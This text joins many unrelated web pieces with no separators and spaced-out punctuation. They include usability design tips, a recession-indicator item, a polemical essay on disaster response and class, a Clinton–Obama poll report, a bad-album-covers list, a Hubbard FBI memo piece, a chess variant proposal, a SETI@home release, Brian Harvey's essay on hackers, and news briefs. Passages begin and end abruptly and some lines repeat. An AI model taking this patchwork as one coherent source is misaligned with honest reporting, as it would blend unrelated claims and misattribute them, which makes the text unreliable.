If you have the choice between separating two design segments by a visible line or by some whitespace , it ’s usually better to use the whitespace solution .
Hierarchical structures reduce complexity ( Simon ’s Law ) : the better you manage to provide users with a sense of visual hierarchy , the easier your content will be to perceive .
White space is good .
Cameron.io uses white space as a primary design element .
The result is a well - scannable layout which gives the content a dominating position it deserves .
8. Communicate effectively with a “ visible language ”
In his papers on effective visual communication , Aaron Marcus states three fundamental principles involved in the use of the so - called “ visible language ” — the content users see on a screen .
Organize : provide the user with a clear and consistent conceptual structure .
Consistency , screen layout , relationships and navigability are important concepts of organization .
The same conventions and rules should be applied to all elements .
: provide the user with a clear and consistent conceptual structure .
Consistency , screen layout , relationships and navigability are important concepts of organization .
The same conventions and rules should be applied to all elements .
Economize : do the most with the least amount of cues and visual elements .
Four major points to be considered : simplicity , clarity , distinctiveness , and emphasis .
Simplicity includes only the elements that are most important for communication .
Clarity : all components should be designed so their meaning is not ambiguous .
Distinctiveness : the important properties of the necessary elements should be distinguishable .
Emphasis : the most important elements should be easily perceived .

Distinctiveness : the important properties of the necessary elements should be distinguishable .
Emphasis : the most important elements should be easily perceived .
Communicate : match the presentation to the capabilities of the user .
The user interface must keep in balance legibility , readability , typography , symbolism , multiple views , and color or texture in order to communicate successfully .
Use max .
3 typefaces in a maximum of 3 point sizes — a maximum of 18 words or 50 - 80 characters per line of text .
9 . Conventions are our friends
Conventional design of site elements does n’t result in a boring web site .
In fact , conventions are very useful as they reduce the learning curve , the need to figure out how things work .
For instance , it would be a usability nightmare if all web - sites had different visual presentation of RSS - feeds .
That ’s not that different from our regular life where we tend to get used to basic principles of how we organize data ( folders ) or do shopping ( placement of products ) .
With conventions you can gain users ’ confidence , trust , reliability and prove your credibility .
Follow users ’ expectations — understand what they ’re expecting from a site navigation , text structure , search placement etc .
A typical example from usability sessions is to translate the page in Japanese ( assuming your web users do n’t know Japanese , e.g. with Babelfish ) and provide your usability testers with a task to find something in the page of different language .
If conventions are well - applied , users will be able to achieve a not - too - specific objective , even if they ca n’t understand a word of it .
Steve Krug suggests that it ’s better to innovate only when you know you really have a better idea , but take advantages of conventions when you do n’t .

Test early , test often
This so - called TETO - principle should be applied to every web design project as usability tests often provide crucial insights into significant problems and issues related to a given layout .
Test not too late , not too little and not for the wrong reasons .
In the latter case it ’s necessary to understand that most design decisions are local ; that means that you ca n’t universally answer whether some layout is better than the other one as you need to analyze it from a very specific point of view ( considering requirements , stakeholders , budget etc. ) .
Some important points to keep in mind :
according to Steve Krug , testing one user is 100 % better than testing none and testing one user early in the project is better than testing 50 near the end .
Accoring to Boehm ’s first law , errors are most frequent during requirements and design activities and are the more expensive the later they are removed .

There might be problems which have n’t been found during the first round as users were practically blocked by other problems .

according to Weinberg ’s law , a developer is unsuited to test his or her code .
This holds for designers as well .
After you ’ve worked on a site for few weeks , you ca n’t observe it from a fresh perspective anymore .
You know how it is built and therefore you know exactly how it works — you have the wisdom independent testers and visitors of your site would n’t have .
Bottom line : if you want a great site , you ’ve got to test .
When the number of Americans out of work starts to rise sharply , a recession occurs .
By that token , the latest figure for unemployed workers is , at the least , a danger sign .
The Labor Department reported that in December some 7,655,000 people were unemployed , meaning they were both without a job and looking for one .
That figure was 13.2 percent higher than the 6,760,000 figure in the previous December .
In the past , a 13 percent annual rise has been the sign of a recession every time .
Before December , there have been nine cycles in the United States since 1950 in which the annual change in unemployment rose to 13 percent or higher .
In eight of those cases , by the time the rise got to 13 percent , the recession had already begun , according to later conclusions by the National Bureau of Economic Research .
In the other one , the recession began three months later , as depicted in the accompanying charts , which show the year - over - year change in the number of unemployed workers from one year before the increase hit 13 percent until one year after the recession ended .
( In the case of the early 1980s , when there were two recessions close together , the chart shows both of them . )
The Boo ai n’t no N.O .

What color is your disaster ?
It makes a difference .
A life and death difference .
Dig :
Population of San Diego fire evacuation zone : 500,000
Population of the New Orleans flood evacuation zone : 500,000
White folk as a % of evacuees , San Diego : 66 %
Black folk as % of evacuees , New Orleans : 67 %
Size counts , too .
Size of your wallet , that is :
Evacuees in San Diego , in poverty : 9 %
Evacuees in New Orleans , in poverty : 27 %
The numbers would be even uglier , though more revealing , if I included evacuees of the celebrity fire in Malibu .
The President did n’t do a photo - strafing of the scene from 1700 feet this time .
Instead , we have the photo op of George , feet on the ground , hanging with Arnold the Action Man .
( However , I ’m informed that the President was a bit disappointed that he did n’t get to wear one of those neat fireman hats like Rudi G got at Ground Zero . )
In 2005 , while the bodies were still being fished out of flooded homes in New Orleans , Republican Congressman Richard Baker praised The Lord for his mercy .
“ We finally cleaned up public housing in New Orleans .
We could n’t do it , but God did , ” he said about the removal of the poor from the project near the French Quarter much coveted by speculators .
But as this week ’s flames spread , no Republican Congressman cried , “ Burn baby burn ! ” to praise the Lord for cleaning up them Boo , the sin-and - surf playground of Hollywood luvvies .
In New Orleans , God ’s covenant with real estate developers has been very profitable .
Over 70,000 families
remain , two years after the waters receded , in mobile home concentration centers far away from the N.O. re-building boom .
Let ’s see how long it takes to get Tom Hanks back on his beach towel .
Standing next to Governor Schwarzenegger , a smug little Bush said , “ It makes a big difference when you have someone in the statehouse willing to take the lead ” – a snide attack on the former Democratic Governor of Louisiana on whom the White House successfully dumped the blame for the horror show in New Orleans .
Mr. Bush never mentioned – and the media would never give away his secret – that 15 hours before the levees broke , the White House and FEMA knew the flood barriers were cracking , yet failed to inform the Governor and state police .
Nor did Mr. Bush mention that his Department of Homeland Security ’s FEMA trolls took away evacuation planning from the state and gave it to a crew of crony contractors who , for a million bucks , came up with a plan that came down to , “ If a hurricane comes , get in your car and drive like hell . ”
In California , plans were in place , money poured down with the flame retardant , and no one is suggesting that Mel Gibson move his swastika collection to a FEMA trailer .
Not comparable , the Boo and the N.O. ?
You can say that again .
But as a kid who grew up in the ass end of Los Angeles , I can tell you that disaster apartheid applies on the local scale as well .
Look at the tarry filth of Compton and Long Beach shores versus the panicked reaction when a bit of garbage or oil sheen hits Malibu sands .
( I remember , standing on the crude - covered shore of an Alaska Native village in March , 1991 , the day Exxon announced it would end the clean - up from the Exxon Valdez spill .
That day , the papers showed the careful scouring that week of every pebble on Malibu beaches hit by dinky spill incident . )
Please do n’t get the idea I ’m slap - happy about the California inferno .
My parents live in San Diego – and one of my favorite Air America hosts had to evacuate from her Del Mar hot tub , poor dear .
( I ’ve heard , however , that billionaires well done taste just like chicken . )
What I ’m saying is : Besides the flames , there ’s a class war raging in America .
Or , should I say , Class Massacre .
Because only one side is taking all the bullets .
Malibu , Beverly Hills , Santa Monica are “ incorporated communities ” – islands of privilege politically fenced off from the riff - raff sea of Los Angeles .
These self - incorporated Bantustans of the wealthy have their own fire departments and schools .
The money islands are relieved of having to pay for the schools and hospitals of the city where their gardeners live .
( I ca n’t tell which is the worst disaster that can befall an Angelino – a fire , an earthquake or the LA public school system . )
Now , it ’s easy to say it ’s just George Bush who ’s the class clown of the class war .
But it ’s an old story .
When a flood took out the tony homes at Westhampton Dunes , the Clinton Administration picked up the full tab for rebuilding these summer hideaways of the investment bankers .
While today , death - by - poison stalks the environment of Black townships of Louisiana ( the FEMA guests ’ are parked in a zone called Cancer Ally ) , Al Gore ca n’t be found .
But when speaking of rising sea levels that can take out the homes of his buddies in Boo or the Hamptons , Gore goes ga-ga .
The one thing I ’ll say in favor of that vile little Louisiana Republican cheering the drowning of public housing residents , at least he 's honest about how the system works .
He ’s not afraid to remind us of the gods ’- honest truth : disaster response is class war by other means .
So let me not forget to report the war ’s body count :
New Orleans flood deaths : 1,577 .
California celebrity fire deaths : 11 ( at time of posting )
Sen . Hillary Rodham Clinton 's robust 25 - point lead over Sen. Barack Obama in California has shrunk by nearly half since October - but state Democratic voters by a 3 - 1 ratio still believe the New York senator has the best chance of winning the presidency , a new Field Poll shows .
With just seven weeks until the state 's Feb.
5 presidential primary , the latest statewide poll shows that 1 in 5 Democrats is undecided - a number that has nearly doubled since early last year .
Among the poll 's key findings :
Both Clinton and Obama enjoy high favorable ratings among Democrats , but Clinton leads 2 - 1 among women and Latinos while Obama has a far more positive image among independent and African American voters .
" There 's no significant surge for Obama , it 's just greater hesitancy amongst those who were formerly supporting Clinton , " said Field Poll director Mark DiCamillo .
But California Democrats are " not really moving to any one candidate , mainly going into the undecided column . "
Clinton has stronger support as a nominee among her party 's voters .
And by a sizable margin , Democratic primary voters also say Clinton has the best chance of being elected president if she becomes the nominee .
Clinton maintains strong leads in key geographic regions - Los Angeles County and the San Francisco Bay Area - and is stronger with voters in every age group .
Obama gets more crossover support from Republicans - 47 percent say they would consider supporting him , versus just 20 percent who would support Clinton .
That suggests that in the general election , " Obama might stand a better chance , " said DiCamillo .
But he cautioned that " Republicans in this state generally get behind the Republican nominee " and that expressed support " might not hold " in a general election .
While former North Carolina Sen. John Edwards ' support has remained stable in California , there is speculation about how Democratic voters in California would be swayed if he does n't do well in the first crucial states of Iowa and New Hampshire .
Second choice preferences among his supporters show Edwards ' voters " would be more inclined to support Obama than Clinton , which could make the race in California closer , " the survey shows .
The latest Field Poll is based on 1,283 registered voters in California - 543 Democrats , 439 Republicans and 301 independent or " decline to state " voters .
Democratic primary preferences were based on 457 voters likely to vote in the Feb. 5 primary .
The margin of error for the survey of likely Democratic voters is plus or minus 4.7 percentage points .
Iowa push : John Edwards coming on strong in final weeks .

Somehow I stumbled on this album cover earlier tonight :
The Handless Organist Truly
Is A Miracle of God , mostly because it led to me looking for other bad album covers .
And I found lots .
So many it was tough to narrow down the list here , but here are the best ( worst ? ) 27 of the bunch ( we ’ll count Ms. Organist up top as number one ) .
2. Ken “ By Request Only ”
Snopes actually has a long ass thread debating whether or not this is actually a real album that you can read here .
The general consensus seemed to be fake at first , which is kind of amazing considering I ’ve seen this all over the internet at some time or another , but then the album showed up in an Ebay auction .
The good people at Snopes then did some digging and Ken is apparently now a pastor in Iowa .
Spurred by the success of the earlier Ebay auction , Ken is now unloading his personal copies of “ By Request Only ” .
His daughter even chimes into the Snopes thread .
I love the internet sometimes .
3 . The Braillettes
Continuing on the Miracle of God theme .
4 . The Frivolous Five “ Sour Cream and Other Delights ”
Really the scariest thing about this album cover is the fact that they are apparently covered in sour cream .
Old person smell + dairy has to be pretty lethal .
5 . The McDonald Sisters “ I ’ve Got Confidence ”
Such an unfortunate title .
6. Alex Dobkin “ Living With Lesbians ”
Subtitled “ Living the Dream ” I imagine .
7. Tino “ Por Primera Vez ”
He seems super concerned that you notice the wedding ring on the left hand .
Wonder why .
8. Swamp Dogg “ Rat On ”
I … you know , I ’ve got nothing .
It ’s a guy riding a giant white rat .
I have no idea .
9 . The Best of The Singing Postman
You have to kind of wonder what the target market was for this guy , but Wikipedia says he actually dethroned the Beatles in 1966 , taking over the number one spot in England for nine weeks .
10 . Gary Dee Bradford “ Sings for You and You and You ”
Another miracle of God !
11 . Hello Lovers , Roger Nusic Here For You Only
I ’ve never met , or heard of , Roger Nusic , but I ’m going to guess he ’s kind of an odd guy .
12 . Mike Crain “ God ’s Power ”
Karatist Preacher .
A very deadly combo from what I hear .
13 . Paddy Roberts “ Songs for Gay Dogs ”
I ’m guessing the Karate Preacher would probably have some strong feelings about this one .
14 . Beastiality
Disturbing on a lot of levels , so kudos for that .
15 . Freddy Gage “ All My Friends Are Dead ”
I ’m guessing this guy was a riot at parties .
16 . Svenne & Lotta
The sweater / hair combo on these two is just stunning .
17 . Millie Jackson
Millie is a lifetime achievement winner , the only artist to have two entries on this list …
18 . Millie Jackson “ E.S.P . ”
And here is the second .
I love the convenient placement of the crystal ball right where it ’ll magnify her breasts .
I also love that she looks like a real life inflatable doll with the weird mouth thing she ’s got going on there .
19 . The Minister ’s Quartet “ Let Me Touch Him ”
No .
Creepy bastards .
20 . Heino
Androgynous way before anyone knew what the hell that word meant .
21 . Pat Boone “ In a Metal Mood ”
Tagline : No More Mr. Nice Guy Pat Boone is here to kick some ass , and he ’s got the evil glint in his eye to prove it .
22 . Lenny Dee “ Down South ”
Down south is where you take your piano everywhere damn it .
23 . Stuff Party
They were going to have a theme for the party , but just … could n’t … think of anything .
24 . The Cooper Family “ I ’m God ’s Child ”
I do n’t think God had much to do with that woman ’s hair .
25 . Butch Yelton and Upbound “ Swing That Gospel Axe ”
I think this is how most serial killers get started , swinging an axe for Jesus .
26 . Christian Crusaders with Al Davis
God obviously had a thing against the guy on the left .
27 . Something Special
And the circle is complete , as we finish with another bonafide Miracle of God .

JANUARY 16 -- With the Church of Scientology 's legal battalion threatening litigation over the widespread posting of that creepy Tom Cruise video , we thought it was the perfect time to reprise one of our favorite memos , this one from L. Ron Hubbard 's FBI file .
The February 1963 document summarizes information contained in the bureau 's files about the Scientology founder , including contacts Hubbard made with the agency and the Department of Justice .
The memo , an excerpt of which you 'll find here , notes that Hubbard had corresponded on several occasions with federal agents , apprising them of ' complaints about his wife and about alleged communists . '
But it was a lengthy May 1951 letter that was singled out in the FBI memo -- surely because the claims in that missive were insane and clearly indicative of Hubbard 's raging lunacy .
Read the memo for Hubbard 's delusional claims about an early - morning attack in his apartment and the related coronary thrombosis .
Seems as plausible as all that Scientology stuff about Xenu , rocket ships , dancing monkeys , and space aliens murdered 75 million years ago .
Okay , we made up the monkey stuff .
While the lasting effects of the ( fictional ) home invasion are unknown , Hubbard appeared to have recovered a month later when he addressed the first national meeting of Dianetics auditors .
Click here to see a photo of L. Ron rocking the mic at that June 1951 confab .

For a long time , Chess was considered the “ ultimate test of cerebral fitness , ” as the 1980 ’s song “ One Night in Bangkok ” proclaimed .
Its popularity probably peaked in 1972 , during the Fischer - Spassky world championship match which seemed to capture the interest of the entire world .
Lately , however , its popularity has seriously declined , because of a number of factors :
1. Humans are no longer the best Chess players in the world .
It ’s somewhat depressing to study and play a game when you know that a program you can buy for $ 50 can out - play you , or any other human .
2 . Chess opening theory has become extraordinarily detailed , and onerous to study .
Very often , grandmaster games begin with 20 or more known theoretical moves .
Moreover , nowadays most new theoretical novelties are suggested and analyzed by computer programs used by top players before their games .
If a player does not keep up with opening theory , he will be at a disadvantage , but many people find the prospect of studying openings in this way increasingly dehumanizing .
3 . Most games between top - flight Chess grandmasters end in a draw , simply because Chess is almost certainly a draw with best play .
To take one example , Kramnik won his match against Kasparov in 2000 with 2 wins , no losses , and 14 draws .
I want to propose here a Chess variant , that I developed with my son Adam , that addresses all these problems .
We call this variant “ Enhanced Chess . ”
In Enhanced Chess , there are no draws , there is no opening theory ( or endgame theory ) to study , there is no advantage for the first player , and humans should out - class computers for a long time to come .
The game is extremely skill - intensive ; the more imaginative and “ cerebrally fit ” competitor will definitely win the game .
The game combines a couple existing Chess variants .
The first of these variants is “ Bughouse Chess . ” Ordinary Bughouse Chess is played by two teams of two players each .
On each team , one player plays White and the other plays Black .
When you capture one of your opponent ’s pieces , you hand it to your partner , who can drop it on his own board rather than making an ordinary move .
Pawns may not be dropped on the first or eighth rank , but otherwise there are no restrictions on drops ; you can even checkmate with a dropped piece .
When a pawn reaches the eighth rank , it is promoted normally , but if the promoted piece is captured , it turns into a pawn again .
The game ends when one of the kings is checkmated .
In ordinary Bughouse you may communicate freely with your partner .
It is normally played with fast time controls ( e.g. 5 minutes for each player for the game ) as a very amusing social game with lots of trash - talk .
Here ’s a video of a typical Bughouse game , where the only unusual thing is that one of the players ( at the back left ) is Levon Aronian , one of the strongest Chess grandmasters in the world , and a participant in the 2007 World Chess Championship :
In Enhanced Chess on the other hand , a single player will control both the boards on his side , so that the game is again a two - player game .
Moreover , the moves are made in a strict turn - based order .
First Player 1 makes a move with White , then Player 2 makes a Black move followed by a White move , and then the players continue to alternate , always making a Black move followed by a White move .
Notice that because Player 1 only makes one move on his first turn , and then Player 2 makes two moves , there is no obvious advantage to going first or second .
Time controls can be as slow as you like ; Enhanced Chess is meant as a serious game .
Turn - based Bughouse is a good game , but if it became standard , it would quickly suffer from the problem of excessive opening theory .
But that problem can be remedied by using the idea , proposed and popularized by Bobby Fischer for ordinary Chess , of randomizing the initial position .
In Enhanced Chess , the initial random position must be identical on the two boards , as in the following diagram of an initial position :
Chess with randomized initial positions ( sometimes called “ Fischer Random Chess ” or “ Chess960 ” because of the 960 legal starting positions ) is already a somewhat popular variant .
Levon Aronian is the current “ world champion ” of this variant , having beaten Vishy Anand ( the current world chess champion in ordinary Chess ) in a short match in 2007 .
One difficult point in Chess960 is how to handle castling .
In Enhanced Chess , we propose to handle this problem by simply forbidding castling .
Castling is usually of dubious utility in any Bughouse Chess variant in any case , and there ’s no reason to carry all the complicated rules baggage .
There would also be more than 960 legal starting positions , because while Chess960 tries to ensure that the kings start between the rooks , in Enhanced Chess that is not necessary .
( We still required that the two bishops on each side start on opposite color squares ) .
It would in fact probably be sufficient if at the beginning of the game , the players alternated on deciding the positions of one piece at a time .
For example , my first move would decide that the Kings go on b1 and b8 .
You then decide that one of the Knights should be placed on f1 and f8 , and so on ( one needs to forbid placements that place the bishops on the same color square or leave no option but for that to happen in the future ) .
This version would remove any element of luck from the game , and I doubt that studying openings would pay with even this amount of “ pre-processing . ”
Making a pair of moves which repeats a position ( on the combined boards ) is forbidden in Enhanced Chess , and stalemate is a loss .
These rules remove any theoretical possibility of a draw .
It is interesting to speculate on what the “ correct ” result would be in Enhanced Chess if God played against God .
There is no obvious end to the game until positions start repeating .
It ’s clearly just idle speculation , but how many moves do you think would need to occur in the perfect game tree before one side won ?
In practice , I do n’t think that Enhanced Chess games would typically last any longer than ordinary Chess games , although a big difference is that players would definitely need to rely much more on intuition and much less on knowledge and calculation .
One other big difference , which would definitely be a drawback for some players , is that reduced - material end - games would cease to exist .
Enhanced Chess would be much like Shogi ( Japanese Chess ) on steroids , but maintaining all the familiar pieces ( and removing the advantage of moving first ) .
Finally , I should address why I think computer programs will play Enhanced Chess poorly , at least in comparison to ordinary Chess .
The main point is that programs basically use a search algorithm , that would be hobbled by the much larger number of possible moves in each position ( remember that for each turn you get one move on each board , and all the drops mean many more possibilities as well , so for each turn there might be 10,000 possibilities for the computer to consider , instead of 30 or so ) .
Evaluating a position will also much more difficult for a computer in Enhanced Chess compared to ordinary Chess , because material and mobility are less important .
I would anticipate based on these points that Enhanced Chess programs would perform significantly worse than Shogi ( Japanese chess ) programs ( where there are drops , but only one move per turn ) , and even in Shogi , computer programs still fall somewhat short of the top level .
In the 15th century , a series of major rules modifications were accepted into Chess ( the modern Queen , Bishop , and Pawn moves , Castling , and en passant ) that succeeded in reviving what had become a rather dull game .
It seems to me that something similar will need to occur again before Chess can reverse its decline and regain its status as the King of Games .

UC Berkeley Press Release
SETI@home looking for more volunteers
– The longest - running search for radio signals from alien civilizations is getting a burst of new data from an upgraded Arecibo telescope , which means the SETI@home project needs more desktop computers to help crunch the data .
Since SETI@home launched eight years ago , the project based at the University of California , Berkeley 's Space Sciences Laboratory has signed up more than 5 million interested volunteers and boasts the largest community of dedicated users of any Internet computing project : 170,000 devotees on 320,000 computers .
Yet , new and more sensitive receivers on the world 's largest radio telescope in Arecibo , Puerto Rico , and better frequency coverage are generating 500 times more data for the project than before .
The SETI@home software has been upgraded to deal with this new data as the search for extraterrestrial intelligence ( SETI ) enters a new era and offers a new opportunity for those who want to help find other civilizations in the universe .
" The next generation SETI@home is 500 times more powerful then anything anyone has done before , " said project chief scientist Dan Werthimer .
" That means we are 500 times more likely to find ET than with the original SETI@home . "
According to project scientist Eric Korpela , the new data amounts to 300 gigabytes per day , or 100 terabytes ( 100,000 gigabytes ) per year , about the amount of data stored in the U.S. Library of Congress .
" That 's why we need all the volunteers , " he said .
" Everyone has a chance to be part of the largest public participation science project in history . "
The 1,000 - foot diameter Arecibo dish , which fills a valley in Puerto Rico , is part of the National Astronomy and Ionosphere Center operated by Cornell University with funds from the National Science Foundation .
Since 1992 , Werthimer and his team have piggybacked on radio astronomy observations at Arecibo to record signals from space and analyze them for patterns that could indicate they were transmitted by an intelligent civilization .
When the team 's incoming data overwhelmed its ability to analyze it , the scientists conceived a distributed computing project to harness many computers into one big supercomputer to do the analysis .
Since SETI@home was launched , other distributed computing projects have arisen , from folding@home to predict the three - dimensional tangle of a protein to the newly - launched cosmology@home to model possible universes .
Most are now on a platform called BOINC ( Berkeley Open Infrastructure for Network Computing ) , which was developed by SETI@home 's director David Anderson so that the various projects could share resources .
" There are now 42 projects on BOINC , and , until now , there has been enough computing power to go around , " Werthimer said .
What triggered the new flow of data was the addition of seven new receivers at Arecibo , which now allow the telescope to record radio signals from seven regions of the sky simultaneously instead of just one .
With greater sensitivity and the ability to detect the polarization of the radio signals , plus 40 times more frequency coverage , Arecibo is set to survey the sky for new radio sources .
These improvements also prime the telescope for an improved search for intelligent signals from space .
" The multiple receivers help us weed out interference better and make us less susceptible to thinking that things terrestrial are extraterrestrial , "
Werthimer said .
Werthimer noted that , despite the fact that UC Berkeley has been analyzing radio signals from space since 1978 on various telescopes , no telltale signals from an intelligent civilization have yet been found .
" Earthlings are just getting started looking at the frequencies in the sky ; we 're looking only at the cosmically brightest sources , hoping we are scanning the right radio channels , " he said .
" The good news is , we 're entering an era when we will be able to scan billions of channels .
Arecibo is now optimized for this kind of search , so if there are signals out there , we or our volunteers will find them . "
SETI@home has been funded by various organizations over the years , including the Planetary Society and Sun Microsystems , and continues to be supported by individual donations from its volunteers .

Skype is preparing to launch its own branded mobile phone in conjunction with the 3 mobile network as early as this month .
The phone is codenamed " white phone " and BusinessWeek reported it would launch in Australia , Britain , Italy and Hong Kong " by late October " .
A spokeswoman for 3 in Australia confirmed it was working with a leading internet communications company " to produce an exciting new product to make free internet calls completely mobile " .
There have been several recommended diaries about the call by House Judiciary committee members Robert Wexler , Tammy Baldwin and Luis Gutierrez for the committee to actually begin hearings on the impeachment of Vice President Dick Cheney .
But do n't you find it curious that there 's been literally no traditional media coverage of it ?
Three Members of Congress , all on the Judiciary Committee , call outright for impeachment hearings , and no one reports it ?
The three even wrote an op - ed together explaining their reasoning and offered it to the New York Times , the Washington Post , etc .
No one has yet agreed to run it .
Is n't that interesting , in and of itself ?
I mean , say what you want about impeachment , but when three members of the Judiciary Committee sign on to a positive call for it , that 's worth a little news blurb , do n't you think ?
Of course , it should also be noted that they wrote a 700 + word op - ed inspired by Dennis Kucinich 's impeachment resolution without ever mentioning Dennis Kucinich , but that 's perhaps a subject for another day .
In the meantime , Wexler 's gathering signatures to gauge support for their call for hearings .
Interested ?
Drop him a line , wo n't you ?
Do n't be embarrassed .
Your neighbors certainly wo n't read about it in the paper .
What is a Hacker ?
Brian Harvey
University of California , Berkeley
In one sense it 's silly to argue about the ``true '' meaning of a word .
A word means whatever people use it to mean .
I am not the Academie Française ; I can't force Newsweek to use the word ``hacker '' according to my official definition .
Still , understanding the etymological history of the word ``hacker '' may help in understanding the current social situation .
The concept of hacking entered the computer culture at the Massachusetts Institute of Technology in the 1960s .
Popular opinion at MIT posited that there are two kinds of students , tools and hackers .
A ``tool '' is someone who attends class regularly , is always to be found in the library when no class is meeting , and gets straight As. A ``hacker '' is the opposite : someone who never goes to class , who in fact sleeps all day , and who spends the night pursuing recreational activities rather than studying .
There was thought to be no middle ground .
What does this have to do with computers ?
Originally , nothing .
But there are standards for success as a hacker , just as grades form a standard for success as a tool .
The true hacker can't just sit around all night ; he must pursue some hobby with dedication and flair .
It can be telephones , or railroads ( model , real , or both ) , or science fiction fandom , or ham radio , or broadcast radio .
It can be more than one of these .
Or it can be computers .
[ In 1986 , the word ``hacker ' ' is generally used among MIT students to refer not to computer hackers but to building hackers , people who explore roofs and tunnels where they 're not supposed to be . ]
A ``computer hacker , '' then , is someone who lives and breathes computers , who knows all about computers , who can get a computer to do anything .
Equally important , though , is the hacker 's attitude .
Computer programming must be a hobby , something done for fun , not out of a sense of duty or for the money .
( It 's okay to make money , but that can't be the reason for hacking . )
A hacker is an aesthete .
There are specialties within computer hacking .
An algorithm hacker knows all about the best algorithm for any problem .
A system hacker knows about designing and maintaining operating systems .
And a ``password hacker '' knows how to find out someone else 's password .
That 's what Newsweek should be calling them .
Someone who sets out to crack the security of a system for financial gain is not a hacker at all .
It 's not that a hacker can't be a thief , but a hacker can't be a professional thief .
A hacker must be fundamentally an amateur , even though hackers can get paid for their expertise .
A password hacker whose primary interest is in learning how the system works does n't therefore necessarily refrain from stealing information or services , but someone whose primary interest is in stealing is n't a hacker .
It 's a matter of emphasis .
Ethics and Aesthetics
Throughout most of the history of the human race , right and wrong were relatively easy concepts .
Each person was born into a particular social role , in a particular society , and what to do in any situation was part of the traditional meaning of the role .
This social destiny was backed up by the authority of church or state .
This simple view of ethics was destroyed about 200 years ago , most notably by Immanuel Kant ( 1724-1804 ) .
Kant is in many ways the inventor of the 20th Century .
He rejected the ethical force of tradition , and created the modern idea of autonomy .
Along with this radical idea , he introduced the centrality of rational thought as both the glory and the obligation of human beings .
There is a paradox in Kant : Each person makes free , autonomous choices , unfettered by outside authority , and yet each person is compelled by the demands of rationality to accept Kant 's ethical principle , the Categorical Imperative .
This principle is based on the idea that what is ethical for an individual must be generalizable to everyone .
Modern cognitive psychology is based on Kant 's ideas .
Central to the functioning of the mind , most people now believe , is information processing and rational argument .
Even emotions , for many psychologists , are a kind of theorem based on reasoning from data .
Kohlberg 's theory of moral development interprets moral weakness as cognitive weakness , the inability to understand sophisticated moral reasoning , rather than as a failure of will .
Disputed questions of ethics , like abortion , are debated as if they were questions of fact , subject to rational proof .
Since Kant , many philosophers have refined his work , and many others have disagreed with it .
For our purpose , understanding what a hacker is , we must consider one of the latter , Sören Kierkegaard ( 1813 -1855 ) .
A Christian who hated the established churches , Kierkegaard accepted Kant 's radical idea of personal autonomy .
But he rejected Kant 's conclusion that a rational person is necessarily compelled to follow ethical principles .
In the book Either - Or he presents a dialogue between two people .
One of them accepts Kant 's ethical point of view .
The other takes an aesthetic point of view : what 's important in life is immediate experience .
The choice between the ethical and the aesthetic is not the choice between good and evil , it is the choice whether or not to choose in terms of good and evil .
At the heart of the aesthetic way of life , as Kierkegaard characterises it , is the attempt to lose the self in the immediacy of present experience .
The paradigm of aesthetic expression is the romantic lover who is immersed in his own passion .
By contrast the paradigm of the ethical is marriage , a state of commitment and obligation through time , in which the present is bound by the past and to the future .
Each of the two ways of life is informed by different concepts , incompatible attitudes , rival premises .
[ MacIntyre , p. 39 ]
Kierkegaard 's point is that no rational argument can convince us to follow the ethical path .
That decision is a radically free choice .
He is not , himself , neutral about it ; he wants us to choose the ethical .
But he wants us to understand that we do have a real choice to make .
The basis of his own choice , of course , was Christian faith .
That 's why he sees a need for religious conviction even in the post - Kantian world .
But the ethical choice can also be based on a secular humanist faith .
A lesson on the history of philosophy may seem out of place in a position paper by a computer scientist about a pragmatic problem .
But Kierkegaard , who lived a century before the electronic computer , gave us the most profound understanding of what a hacker is .
A hacker is an aesthete .
The life of a true hacker is episodic , rather than planned .
Hackers create ``hacks . ''
A hack can be anything from a practical joke to a brilliant new computer program .
( VisiCalc was a great hack .
Its imitators are not hacks . )
But whatever it is , a good hack must be aesthetically perfect .
If it 's a joke , it must be a complete one .
If you decide to turn someone 's dorm room upside - down , it 's not enough to epoxy the furniture to the ceiling .
You must also epoxy the pieces of paper to the desk .
Steven Levy , in the book Hackers , talks at length about what he calls the ``hacker ethic . ''
This phrase is very misleading .
What he has discovered is the Hacker Aesthetic , the standards for art criticism of hacks .
For example , when Richard Stallman says that information should be given out freely , his opinion is not based on a notion of property as theft , which ( right or wrong ) would be an ethical position .
His argument is that keeping information secret is inefficient ; it leads to unaesthetic duplication of effort .
The original hackers at MIT - AI were mostly undergraduates , in their late teens or early twenties .
The aesthetic viewpoint is quite appropriate to people of that age .
An epic tale of passionate love between 20 - year - olds can be very moving .
A tale of passionate love between 40 - year - olds is more likely to be comic .
To embrace the aesthetic life is not to embrace evil ; hackers need not be enemies of society .
They are young and immature , and should be protected for their own sake as well as ours .
In practical terms , the problem of providing moral education to hackers is the same as the problem of moral education in general .
Real people are not wholly ethical or wholly aesthetic ; they shift from one viewpoint to another .
( They may not recognize the shifts .
That 's why Levy says ``ethic '' when talking about an aesthetic . )
Some tasks in moral education are to raise the self - awareness of the young , to encourage their developing ethical viewpoint , and to point out gently and lovingly the situations in which their aesthetic impulses work against their ethical standards .

BRUSSELS ( Reuters ) - European Union leaders on Monday condemned the “ heavy - handed ” police crackdown on opposition protests in Russia at the weekend and said freedom of speech and assembly were fundamental rights .
“ I was very concerned to see reports of police harassment and arrests of politicians and peaceful demonstrators in Russia , ” European Commission President Jose - Manuel Barroso said in a statement .
“ The right to peaceful free speech and assembly are basic fundamental human rights and I very much regret that the authorities found it necessary to take such heavy - handed action . ”
Russian riot police beat opposition activists on Sunday and detained nearly 200 people at protest rallies against President Vladimir Putin a week before parliamentary elections .
Among those detained were Boris Nemtsov and Nikita Belykh , leaders of the Union of Right Forces ( SPS ) party who are both running in the December 2 election .
They were later released .
EU President Portugal said that freedoms of association , assembly and speech were among the civil rights the 27 - nation bloc regards as essential .
“ The Presidency calls on Russia to refrain from any action which might be perceived in any way as harmful to Russia ’s international reputation , ” it said in a statement .
One of those detained in Moscow on Sunday was opposition leader and former world chess champion Garry Kasparov -- a move the United States condemned on Sunday as part of “ aggressive tactics ” by authorities .
The European Parliament president , Hans - Gert Poettering , said Kasparov ’s arrest and the actions of the security forces against protestors were disproportionate in their severity .
Putin ’s opponents accuse the Kremlin chief of cracking down on the freedoms won after the 1991 fall of the Soviet Union and of creating what they say is an unstable political system dependent on Putin alone .
Kremlin officials say the opposition marches are aimed at attracting attention in the West and that the activists are a mixed bag of marginal politicians with little public support .

BOSTON — A Boston firefighter is mending from what could have been deadly stab wounds he suffered early yesterday morning when he was allegedly jumped in East Boston while off duty by a group of Hispanic males who told him they " do n't want any gringo here . "
Though police are not classifying the incident as racially fueled , the Boston Police Department 's Community Disorders Unit is investigating .
The 32 - year - old jake , whose name officials were not releasing , is white .
